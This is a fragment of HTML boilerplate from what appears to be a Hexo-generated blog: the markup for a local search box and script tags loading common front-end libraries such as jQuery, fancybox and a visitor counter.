class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script id="canvas_nest" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="/js/third-party/canvas-nest.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script><script src="/js/search/local-search.js"></script></body></html>
